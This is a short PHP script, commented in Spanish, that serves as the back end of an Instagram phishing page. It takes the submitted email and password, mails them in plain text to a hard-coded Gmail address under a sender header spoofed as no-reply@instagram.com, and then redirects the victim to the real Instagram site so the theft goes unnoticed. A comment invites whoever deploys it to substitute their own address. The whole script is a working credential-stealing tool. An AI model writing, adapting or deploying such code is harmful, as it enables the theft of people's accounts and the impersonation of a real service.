<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = trim($_POST["email"]);
    $password = trim($_POST["password"]);

    // Validaciones básicas
    if (!empty($email) && !empty($password)) {
        $to = "matiasleonelibarra37@gmail.com"; // Cambia esto a tu correo
        $subject = "Nuevo inicio de sesión en Instagram";
        $message = "Correo: $email\nContraseña: $password";
        $headers = "From: no-reply@instagram.com";

        // Enviar el correo
        mail($to, $subject, $message, $headers);

        // Redirigir a la página de Instagram original
        header("Location: https://www.instagram.com");
        exit();
    }
}
?>
